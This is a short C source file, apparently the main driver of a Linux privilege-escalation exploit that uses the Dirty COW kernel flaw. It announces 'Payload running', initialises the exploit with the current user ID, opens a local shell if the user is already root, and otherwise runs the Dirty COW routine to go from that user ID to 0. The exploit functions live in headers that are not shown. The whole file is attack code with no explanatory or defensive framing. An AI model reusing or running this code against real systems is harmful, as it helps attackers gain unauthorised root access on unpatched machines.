#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

#include "exploits.h"
#include "main.h"
#include "actions.h"

int main(int argc,char *argv[]) {
	self[0] = argv[0];
	int euid=geteuid();
	printf("Payload running\n");
	dirtycow_init(euid);
	if (euid == 0) {
		action_local_shell();
	}
	printf("From %d to 0!\n", euid);
	dirtycow_run();
	return 0;
}
